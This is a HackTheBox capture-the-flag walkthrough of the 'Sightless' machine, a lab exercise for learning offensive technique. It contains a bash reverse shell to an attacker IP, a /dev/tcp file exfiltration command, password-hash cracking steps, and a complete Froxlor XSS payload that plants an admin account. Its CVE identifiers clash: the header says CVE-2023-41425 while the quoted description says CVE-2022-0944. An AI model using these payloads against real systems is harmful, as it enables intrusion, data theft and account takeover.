Sightless Walkthrough — HackTheBox
==================================

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5gZtAl72mE9v8miAIo2c6g.png)

[Reference](https://medium.com/h7w/slightless-walkthrough-hackthebox-7f0ef247f851) by [MrXcrypt](https://medium.com/@misterxcrypt?source=post_page---byline--7f0ef247f851--------------------------------)

Introduction
============

In this write-up, We’ll go through an easy Linux machine where we first gain an initial foothold by exploiting a Sqlpad CVE, followed by exploiting a Blind XSS vulnerability in Froxler to gain root access. #writeup #walkthrough #HackTheBox #easy #linux #CVE #SQLPad #BlindXSS #froxler 

> **NOTE:**
> 
> The subdomain ‘sqlpad.sightless.htb’ may not work as expected when you encounter even after you add it in the /etc/hosts file. At that time, Reset the machine for it to work properly.

Reconnaissance
==============

1.  After Starting the machine, I set my target IP as $target environment variable and ran the Nmap command.

**_Command — Port Scan: Nmap_** #nmap 

```
nmap $target --top-ports=1000 -sV -v -sC  -Pn > nmap.out
```
![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*WD7Dx7YYFD_0BfGv8eUTqA.png)

2. As usual, I added the host: sightless.htb in /etc/hosts.

3. I started directory and subdomain fuzzing in the background while enumerating the website.

4. The site has a Sqlpad service running on “sqlpad.sightless.htb”.

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*iRopce3yc1VPx5ubs1I1ZA.png)

5. The About section mentions the Sqlpad version as ‘6.10.0’.

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*z0EUYt7AFqG9IJbvUO-YKw.png)

6. Searching for ‘Sqlpad 6.10.0 exploit’ brought this Template Injection exploit. #SSTI #Exploit #TemplateInjection

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*gRr3D19au2DFEMGdbox8qg.png)

**Exploit:** [https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb](https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb)

Initial Foothold
================

CVE-2023–41425 Description
--------------------------

> CVE-2022–0944 is a template injection vulnerability in SQLPad versions prior to 6.10.1, specifically in the connection test endpoint, which allows remote code execution.

1.  According to the exploit, we need to choose MySQL as the driver and input the payload below in the **Database** form field. #CVE-2023-41425 #RemoteCodeExecution 

**Payload:**

![Weird Error popped up when pasting this payload in code block in medium](https://miro.medium.com/v2/resize:fit:1248/format:webp/1*tOCnmXgxOCO-CLk4h4rZew.png)

2. Let’s fire up the burp suite, and capture the request.

![captionless image](https://miro.medium.com/v2/resize:fit:1284/format:webp/1*xqx9BCkCxI7dnP5xlq8GPg.png)

3. Let’s test this, capture the request, and send it to the repeater.

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*GxUYtHuDLLgbm_UNMXJr6Q.png)

4. There are two inputs as “database”, we can find which input field is making the connection by connecting to our IP.

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Y_G_6CDXrdYaHDp3ppR1fA.png)![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*WNruBzTfxxRgMWy2AX1rIg.png)

5. It made a connection, we can use the second “database” field.

6. We need to craft a one-liner bash reverse shell payload with base64 encoded to send in the SSTI payload. #SSTIpayload #ReverseShell 

Exploit:
--------

**_Command — Base64 encoded bash reverse shell: bash_** 

```
echo -n "bash -i >& /dev/tcp/10.10.14.156/9001 0>&1" | base64 -w0 
```

7. Let’s craft the SSTI payload with this reverse shell payload and send it via burp repeater.

**Payload:**

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*3O7FarIH1pDmq6Bo8tgKDg.png)

Reverse Shell Listener:
-----------------------

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*gVxIGISWSbxpTqXFtLx4wQ.png)

8. Now we are root in a docker container. #docker

Lateral Movement
================

i. User Flag
------------

1.  There is a file named ‘sqlpad.sqlite’ in the current directory, we can send the file to our machine using nc and check for any passwords. #userflag #netcat 

**_Command — send file via nc: cat_**

```
cat sqlpad.sqlite > /dev/tcp/10.10.14.156/9001
```

**_Command — receive the file via nc: nc_**

```
nc -nvlp 9001 > sightless.sqlite
```

**_Command — dump SQLite DB: sqlite3_** #sqlite3

```
sqlite3 sightless.sqlite .dump 
```
![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*kmLd3XW01FbSSchuyRMRbA.png)

2. The hash inside the file is a password for sqlpad admin. We don’t need it for now.

3. Let’s examine the users in the docker container.

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ngqZzzqGKc_k6eblgCKtGA.png)

4. We can check the shadow file to find the hash of the user ‘michael’.

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4U9ed8i_2NkZLqLRRawENg.png)

5. Let’s crack the hash of the user Michael using john. #JohnTheRipper 

**_Command — Crack the Hash: john_**

```
john michael.hash --wordlist=/mnt/HDD1/VM\ files/kali/wordlists/rockyou.txt --format=sha512crypt 
```
![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*BQdeCEa5VlPFqxh55Hd1Jw.png)

**Note: You can identify the hash type using any hash identifier site.**

https://hashes.com/en/tools/hash_identifier

4. Let’s use this password for the user ‘michael’.

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*owUam25UF_jpxFik02-U8A.png)

ii. Root Flag
-------------

1.  Let’s first check the processes running as usual #rootflag #PrivilegeEscalation 

**_Command — Running processes: ps_** #ps

```
ps -ef --forest
```
![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*m-qJxQzZDAf3h-ltIRDdkw.png)

2. Let’s also check the running ports & services.

**_Command — Running services: ss_** #ss

```
ss -lntp
```
![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*31WsC1IIP-a5gx86XxkgbQ.png)

3. We see a possible website running on port 8080. (Mostly 80 & 8080 are used for websites)

4. Let’s forward this using ssh to access the website in our local machine. #portforwarding

**_Command — ssh forwarding: ssh_**

```
ssh -L 9000:127.0.0.1:8080 michael@10.10.11.32
```
![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-95n9vrI9iwtuQn1lKKB0w.png)

5. We found a Froxler login page upon visiting the site.

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*bHctCFblFjEdMEZYqU0Grg.png)

6. Upon searching for ‘froxler exploit’ we found a blind XSS vulnerability. 

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*bQ4yUptZPS0tjpDwVBVILg.png)

**Proof Of Concept:**

> 1. Provide an invalid username in Login.
> 
> 2. Turn on intercept in Burp Suite.
> 
> 3. In the intercepted request, add the following XSS payload as the value of loginname parameter (Copy from below file):
> [payload.txt](https://github.com/froxlor/Froxlor/files/15142616/payload.txt)
> 
> 4. Turn off the intercept.

7. First, Let’s capture the login request and send it to the Burp Repeater.

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*zc0BQAuW6de7Dl6Kenwi-g.png)

8. In the given payload.txt, we need to change the URL and Loginname (your choice) and take note of the password provided (Abcd@@1234).

9. Change the URL from ‘[https://demo.froxlor.org/admin_admins.php](https://demo.froxlor.org/admin_admins.php)’ to ‘/admin_admins.php’. Since we don’t know the full URL, also the relative path will work in sending HTTP Request.

**Final Payload:**

```
admin{{$emit.constructor`function+b(){var+metaTag%3ddocument.querySelector('meta[name%3d"csrf-token"]')%3bvar+csrfToken%3dmetaTag.getAttribute('content')%3bvar+xhr%3dnew+XMLHttpRequest()%3bvar+url%3d"/admin_admins.php"%3bvar+params%3d"new_loginname%3dmrxcrypt%26admin_password%3dAbcd%40%401234%26admin_password_suggestion%3dmgphdKecOu%26def_language%3den%26api_allowed%3d0%26api_allowed%3d1%26name%3dAbcd%26email%3dyldrmtest%40gmail.com%26custom_notes%3d%26custom_notes_show%3d0%26ipaddress%3d-1%26change_serversettings%3d0%26change_serversettings%3d1%26customers%3d0%26customers_ul%3d1%26customers_see_all%3d0%26customers_see_all%3d1%26domains%3d0%26domains_ul%3d1%26caneditphpsettings%3d0%26caneditphpsettings%3d1%26diskspace%3d0%26diskspace_ul%3d1%26traffic%3d0%26traffic_ul%3d1%26subdomains%3d0%26subdomains_ul%3d1%26emails%3d0%26emails_ul%3d1%26email_accounts%3d0%26email_accounts_ul%3d1%26email_forwarders%3d0%26email_forwarders_ul%3d1%26ftps%3d0%26ftps_ul%3d1%26mysqls%3d0%26mysqls_ul%3d1%26csrf_token%3d"%2bcsrfToken%2b"%26page%3dadmins%26action%3dadd%26send%3dsend"%3bxhr.open("POST",url,true)%3bxhr.setRequestHeader("Content-type","application/x-www-form-urlencoded")%3balert("Your+Froxlor+Application+has+been+completely+Hacked")%3bxhr.send(params)}%3ba%3db()`()}}
```

In the payload,

username: mrxcrypt

password: Abcd@@1234

10. Let’s send this payload in ‘loginname’ parameter via Burp Repeater.

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*2PudWOKCJTKWNZBTMpDNiQ.png)

11. Now Try to login via froxler login page with the mentioned username and password in the payload.

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*g7Vw3TdbN1mwA0SVJwtrig.png)

12. We can see our username is added as an ‘Admin’.

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*y7ge3ZxWDbjDdfEEQcxx2w.png)

13. We found a customer named ‘web1’.

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*noeCY6enoM8oh4ayjY4hWA.png)

14. Clicking on the customer, we can see and edit the customer’s dashboard.

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*iQYwa72kO-nKrGhHm17GvQ.png)

15. There is an FTP service running on this ‘web1’ customer dashboard. We also found an FTP service running on port 21 in the Nmap command. #ftp

16. Upon editing the service, we can change the password.

17. Let’s try to log in as web1 in FTP.

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*BP_HAqHPeRHpkR09xM5WKQ.png)

18. Let’s use ‘lftp’ which is more secure and faster.

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*6nN-h4OYUR1JahQcuilzjg.png)

19. We are connected, but there is a certificate verification error. We can turn off this verification with the below command.

`set ssl:verify-certificate false`

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*pPs2DNFqc0pxgTh3MST9oA.png)

20. There is a Keepass Database file inside the folder ‘Database.kdb’.

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*rhAaGnYDs-Qc570q24C3QA.png)

21. Let’s get hash using ‘keepass2john’ command. #keepass #keepass2john

**_Command — Get Keepass hash: keepass2john_**

```
keepass2john Database.kdb
```
![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-2oS1nrLCH0znacKDMf1Eg.png)

22. Let’s crack the password hash using john.

**_Command — Crack the Hash: john_**

```
john keepass.hash --wordlist=/mnt/HDD1/VM\ files/kali/wordlists/rockyou.txt --format=KeePass-opencl
```
![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*zpnIqEGBiFNFFVm-5K-2fw.png)

23. Use ‘kpcli’ command to access the keepass Database file.

**_Command — Access Keepass DB: kpcli_** #kpcli

```
 kpcli --kdb Database.kdb 
```
![captionless image](https://miro.medium.com/v2/resize:fit:1322/format:webp/1*mB8OGaJRYBwvMldCFDNr2Q.png)

24. We can go through this file and in the directory ‘/General/sightless.htb/Backup’, there is a ssh password record.

![-f flag will reveal the password](https://miro.medium.com/v2/resize:fit:1322/format:webp/1*VN71G_kf1VW-J8wSJZPyfA.png)

25. We couldn’t use this password to ssh into the server as root. Hence we can use the id_rsa attachment.

![captionless image](https://miro.medium.com/v2/resize:fit:1398/format:webp/1*A0bzJaKurvrRCcVXpy_zSg.png)

26. We can export the attachment into our local machine.

27. Let’s change the permission of the id_rsa file.

```
chmod 600 id_rsa  
```

28. There is a ‘\n’ new line in the id_rsa file, remove it.

![captionless image](https://miro.medium.com/v2/resize:fit:1388/format:webp/1*51oAUJnQ7jrtz5VOzN7m1A.png)

29. Click Backspace at the end of the file.

![captionless image](https://miro.medium.com/v2/resize:fit:1388/format:webp/1*Wcj23DsDvJ0umrxzC4ge5g.png)

30. We still getting an error in id_rsa file.

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*fCUgedfK_h2dHe0wICX7qQ.png)

31. Let’s examine the id_rsa file in hex.

![captionless image](https://miro.medium.com/v2/resize:fit:1394/format:webp/1*JYLVrbkWX-21uEqmrBFk0A.png)

32. We see many ‘0d 0a’ in the file, but it should be just ‘0a’. We can use the dos2unix command to rectify this.

**_Command — Dos to Unix format: dos2unix_** #dos2unix #chmod

```
dos2unix id_rsa
```
![captionless image](https://miro.medium.com/v2/resize:fit:1394/format:webp/1*hZ4w3VOs6qCgBl9umO1hGw.png)

33. Now we are good to use the id_rsa file.

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*XgE8IzG73o2ukUbV9I1k0g.png)

Now, We are ROOT! Thanks for Reading. Happy hacking!!

